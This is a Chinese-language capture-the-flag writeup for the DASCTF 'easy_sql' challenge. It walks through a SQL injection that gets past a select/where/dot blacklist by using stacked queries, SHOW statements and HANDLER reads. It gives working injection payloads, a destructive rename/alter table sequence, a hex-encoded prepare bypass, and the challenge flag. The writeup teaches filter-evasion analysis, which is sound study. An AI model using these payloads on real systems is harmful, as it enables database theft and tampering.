---
title: "DASCTF · easy_sql 题解：无 select 的堆叠注入链"
date: 2026-11-08
pinned: false
description: "SQL 注入 + 关键字黑名单（select/where/点号）+ 堆叠查询 + HANDLER 旁路"
tags: [ctf, web, WriteUp]
categories: [web]
draft: false
cover: /hero/bg-06-glm.jpg
---

# DASCTF · easy_sql —— Writeup（无 select 的堆叠注入链）

| 项目         | 内容                                                                  |
| ---------- | ------------------------------------------------------------------- |
| 题名         | easy_sql（取材于某次真实环境渗透，只说一句话：开发和安全缺一不可）                               |
| 靶场地址       | `http://3b040c875045f6ef0dbbf789.http-ctf2.dasctf.com/`             |
| 题型         | SQL 注入 + 关键字黑名单（select/where/点号）+ 堆叠查询 + HANDLER 旁路                 |
| 环境         | openresty + PHP 7.3.10，MariaDB 10.3.18，当前 MySQL 用户 `root@localhost` |
| 入口         | `GET /?inject=<值>`，页面用 `var_dump` 打印**每个**结果集                      |
| 过滤         | 7 个关键字 + 点号，大小写不敏感（完整正则见下方代码块）                                  |
| 最终 payload | `?inject=1';handler%20%601919810931114514%60%20open;handler%20%601919810931114514%60%20read%20first%23` |
| Flag       | `CTF2{dbb93a9f-15cb-49cb-9d71-a59571afda72}`                        |
| 解题日期       | 2026-11-07                                                          |

过滤规则原文（`/i` 表示大小写不敏感）：

```php
preg_match("/select|update|delete|drop|insert|where|\./i", $inject);
```


---

## 一、题目形态

首页是一个 GET 表单，参数名 `inject`，默认值 `1`。页面顶部把过滤规则原样打印出来：

```php
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

页面行为（后面所有判断都依赖它）：

| 行为 | 表现 |
|---|---|
| 正常查询 | 用 `var_dump` 打印**结果集的每一行**，形如 `array(2) { [0]=> string(1) "1" ... }` |
| 命中过滤 | 不执行 SQL，只回显上面那行 `preg_match` 代码 |
| SQL 出错 | 完整回显 MariaDB 原文报错，含版本号与 `near '...'` 片段 |

**三条反馈通道**：正常 / 被拦 / 报错。分清它们，比记 payload 重要。

后端语句可由报错反推：

```sql
select * from words where id = '$inject'
```

依据：`inject=1'` 时报 `near ''1'''`（尾部引号是模板自己带的），且页面只回 `array(2)` 单行。

---

## 二、环境探测（四步基线，不能跳）

| 步 | 请求 | 返回 | 结论 |
|---|---|---|---|
| 1 | `inject=1` | `array(2){ "1", "hahahah" }` | 查询正常，回显是 `var_dump` |
| 2 | `inject=1'` | `error 1064 ... near ''1'''` | **单引号字符型**，且报错可回显 |
| 3 | `inject=1' order by 2%23` / `order by 3%23` | 前者正常 / 后者 `error 1054 Unknown column '3'` | **结果集 2 列** |
| 4 | `inject=1' and 1=1%23` / `and 1=2%23` | 前者三行 / 后者空白 | **布尔真假可控**（备用通道） |

顺带可读环境：`extractvalue(1,concat(0x7e,database()))` → `supersqli`，`@@version` → `10.3.18-MariaDB`，`current_user()` → `root@localhost`。

---

## 三、第一步撞墙：union 这条路根本不通

最自然的想法：

```
inject=-1' union select 1,group_concat(schema_name) from information_schema.schemata --+
```

这条 payload **同时踩了两个雷**：

| 片段 | 命中 | 后果 |
|---|---|---|
| `select` | `select` | WAF |
| `information_schema.schemata` | `\.` | WAF（即使绕过 select 也会在这里死第二次） |

即使把两处都绕过，`union` 后面**必须**跟一个查询表达式，而 MySQL 里最短的查询表达式就是 `select` —— 这条路是被**语法**堵死的，不是被 WAF 堵死的。

这就是本题的分水岭：**不要想着"怎么把 select 写进去"，要想"不写 select 怎么拿到数据"。**

---

## 四、三个关键原理

### 原理 1：黑名单是「子串匹配」，不是「词法匹配」

`preg_match` 只看字符串里有没有那几个片段，不理解 SQL 语法。两个推论：

| 现象 | 原因 |
|---|---|
| `updatexml()` 也被拦 | 函数名里含 `update` 这个子串 |
| `handler` / `show` / `rename` / `prepare` 能过 | 它们的名字里没有那 7 个片段 |
| `SeLeCt` 无效 | 规则带 `/i`，大小写不敏感 |
| `sel/**/ect` 无效 | 注释只能出现在两个 token **之间**，塞进关键词内部 MySQL 直接语法错 |
| `seselectlect` 无效 | 双写只对 `preg_replace`（替换一次）有用，`preg_match` 只判断不替换 |

**记住这点，比记任何 payload 都值钱**：被拦的从来不是"某个操作"，而是"某几个字母的组合"。

### 原理 2：`\.` 的杀伤力是双份的

| 被禁的东西 | 连带后果 |
|---|---|
| `库.表`、`表.列` | 无法跨库引用；`information_schema.tables` 写不出来 |
| `information_schema.tables` | **元数据查询这条路整条断掉** |
| 小数、`@a:=1` | 一些边角写法也废了 |

所以常规的"先查 information_schema 列表 → 再 select 数据"两步走，第一步就死了。

**破法**：MySQL 里还有一批语句，引用表**不需要点号**：

```sql
show tables                       -- 当前库所有表
show databases                    -- 所有库
show columns from 表名             -- 表的字段
desc 表名
```

这就是「点号过滤」逼出来的转向：**从 `information_schema` 转向 `show` 系列**。

### 原理 3：`;` 没被过滤，等于把「语句级执行」交给你了

过滤规则清一色是关键字 + 点号，唯独漏了 `;`。这直接意味着**堆叠查询可用**（mysqli 多语句 / PDO 相应配置）。

一旦能堆叠，你就从"只能改 WHERE 条件"升级成"能执行任意 SQL 语句"——虽然关键字库里还缺 `select`。

而页面 `while` 循环打印**每个**结果集，正好让堆叠语句的输出也能被看见。三个条件缺一不可：

```
能堆叠  +  有不需要 select 的读表语句  +  页面打印所有结果集
   ↓              ↓                        ↓
 执行通道        数据来源                  观察窗口
```

---

## 五、完整解题步骤（全部实测）

| 步 | 请求（URL 编码后） | 返回 | 推出什么 |
|---|---|---|---|
| 1 | `inject=1` | `array(2){ "1","hahahah" }` | 注入点在 `id`，回显是 var_dump |
| 2 | `inject=1'` | `error 1064` | 单引号字符型，报错回显可用 |
| 3 | `inject=1'%20and%201=1%23` / `1=2%23` | 有 / 无 | 布尔可控 |
| 4 | `inject=1'%20order%20by%202%23` | 正常 | 2 列；`order by 3` 报 1054 |
| 5 | `inject=-1'%20union%20select%201,2--+` | 回显 `preg_match` 那行 | **被拦，不是语法错** |
| 6 | `inject='%20OR%20'1'='1` | 三行 `array(2)` | 恒真成立，整张 `words` 表被 dump |
| 7 | `inject=1';show%20tables%23` | 追加 `array(1){"1919810931114514"}`、`array(1){"words"}` | **堆叠可用**；存在一张纯数字表 |
| 8 | `inject=1';show%20columns%20from%20%601919810931114514%60%23` | `array(6){ "flag","varchar(100)","NO",... }` | 目标表只有一列 `flag` |
| 9 | `inject=1';handler%20%601919810931114514%60%20open;handler%20%601919810931114514%60%20read%20first%23` | `array(1){ string(42) "CTF2{...}" }` | 拿到 flag |

第 6 步的用处不是拿数据，而是**验证引号闭合方式 + 确认页面会打印整个结果集**（三行都出来了）。这个观察决定了后面敢用 `handler`——因为它的输出同样是一个结果集。

---

## 六、最后一关：`select` 被禁，怎么把那一行读出来

此时你手上有：表名 `1919810931114514`、列名 `flag`、能堆叠、能看所有结果集。**但就是写不了 `select`。**

三条路：

### 路线 A：`HANDLER`（本题采用，非破坏性）

`HANDLER` 是存储引擎级的"游标"语句，直接打开表、按行读，**全程不涉及 `select`**：

```sql
handler `1919810931114514` open;
handler `1919810931114514` read first;
```

| 特点 | 说明 |
|---|---|
| 不需要 `where`、不需要列名 | 它按行读，不构造查询 |
| 关键字不在黑名单 | `handler` 不含那 7 个片段 |
| 返回真结果集 | 页面的 `while` 循环照样打印 |
| 非破坏性 | 只读，不留后遗症 |

注意事项：

- 两条语句**必须指向同一张表**（把 `open` 用表名、`read` 用列名是最容易犯的错，会静默失败）
- 纯数字表名必须用反引号，否则被当整数解析
- 多行时用 `read next` 继续

### 路线 B：`rename` 偷梁换柱（经典但破坏性）

思路：程序的 `select * from words where id='$inject'` 里，表名 `words` 是写死的。既然改不了语句，就**改表**——把数字表改名成 `words`，让程序自己帮你查。

坑在于程序的 `where id='1'` 需要 `id` 列，而数字表只有 `flag` 一列：

```
error 1054 : Unknown column 'id'
```

所以实际需要三步：

```sql
rename table words to words2;
alter table `1919810931114514` change flag id varchar(100);
rename table `1919810931114514` to words;
-- 然后正常提交 inject=1
```

顺序错一步、或中途报错，靶场结构就被改坏且无法刷新恢复。**能用 HANDLER 就别用这条。**

### 路线 C：`prepare` + 十六进制（最优雅，但这题有第二层 WAF）

思路：把整条 `select * from ...` 塞进用户变量，变量值用十六进制写，这样 `select` 两个字**根本不出现在你的输入里**：

```sql
set @a = 0x73656c656374202a2066726f6d20...;
prepare b from @a;
execute b;
```

过滤器只能看输入字符串，看不到你拼进变量的内容——这是黑名单类 WAF 的结构性缺陷。

但这道题在页面打印的规则之外**还藏了第二层**：

```php
strstr($inject, "set") && strstr($inject, "prepare")
```

一旦输入里同时出现 `set` 和 `prepare`，直接拦。这正是标题那句"开发和安全缺一不可"的含义：**你看到的 WAF 不是全部的 WAF。**

---

## 七、五个真实卡点（复盘）

| # | 现象 | 真实原因 | 记住什么 |
|---|---|---|---|
| 1 | `?inject=1' and 1=2#` → `error 1064 near ''`  | `#` 是 URL 的 fragment，**浏览器根本不会发出去** | 注释符必须写 `%23`；`--` 后必须跟空格（`--%20` / `--+`） |
| 2 | `show columns from 'hahahah'` 无任何输出 | `hahahah` 是**字段值**，不是表名；单引号还把它变成字符串 | 表名只能从 `show tables` 来 |
| 3 | `show columns from 'string(7)'` 无输出 | 把 `var_dump` 的**类型标记**当成数据抄了 | `string(7)` 是"字符串、7 字节"，值在引号里 |
| 4 | 第二条 handler 写成 `handler flag read first`（无输出） | 第二条用了**列名**当表名 | `open` 与 `read` 必须同一张表 |
| 5 | 堆叠语句写错，页面什么都不显示 | **只有第一条查询的报错会回显**，堆叠语句的错误被吞 | 判断堆叠是否成功，只看有没有多出新的 `array(...)` |

第 5 条是本题最容易让人放弃的地方：你以为是"被 WAF 拦了"，其实只是"语法错得没人告诉你"。

---

## 八、可复用的方法论

碰到「SQL 注入 + 关键字黑名单」，按这个顺序推：

| 顺序 | 问什么 | 本题答案 |
|---|---|---|
| 1 | 反馈通道有几种？ | 正常 dump / 回显过滤代码 = 拦 / MariaDB 原文报错 |
| 2 | 注入类型与列数？ | 单引号字符型，2 列（`order by` 定界） |
| 3 | 黑名单匹配的**粒度**是什么？ | 子串匹配 → `updatexml` 因含 `update` 而死 |
| 4 | 有没有**没被列入**的关键字能完成同样的事？ | `show` 替代元数据查询，`handler` 替代 select |
| 5 | 有没有没被列入的**分隔符 / 语法**？ | `;` → 堆叠，把"改条件"升级成"执行语句" |
| 6 | 过滤的是**输入**还是**执行内容**？ | 输入 → `prepare` + 十六进制可以绕过（本题被第二层 WAF 补刀） |

一句话：**黑名单永远只能枚举"它想到的东西"，解题就是找它没想到的那一个词。**

---

## 九、汇总表

| 项目 | 内容 |
|---|---|
| 入口 | `GET /?inject=<值>`，字符型（`id='$inject'`），2 列 |
| 过滤 | select / update / delete / drop / insert / where / 点号，`/i`，子串匹配 |
| 关键弱点 1 | 点号被禁 → 但 `show tables` / `show columns from 表` 不需要点 |
| 关键弱点 2 | `;` 未过滤 → 堆叠可用，可执行任意语句 |
| 关键弱点 3 | 黑名单无 `handler` → 无需 select 即可读行 |
| 隐藏限制 | 第二层：`strstr($inject,"set") && strstr($inject,"prepare")` |
| 数据来源 | `words`（业务表）+ `1919810931114514`（纯数字，含 `flag` 列） |
| 探测顺序 | `1` → `1'` → `and 1=1/1=2` → `order by` → 定位 |
| 最终 payload | `1';handler%20%601919810931114514%60%20open;handler%20%601919810931114514%60%20read%20first%23` |
| 编码要点 | `#`→`%23`、空格→`%20`、反引号→`%60` |
| 备选方案 | `rename` 三步（破坏性）、`prepare`+hex（撞第二层 WAF） |
| Flag | `CTF2{dbb93a9f-15cb-49cb-9d71-a59571afda72}` |

**一句话总结**：出题人封了 `select`，就等于封了"自己造查询"；但没封 `;`（能执行语句）、没封 `handler`（能不查而读），于是绕过点从"怎么改写 select"变成了"怎么换一条读数据的语句"。
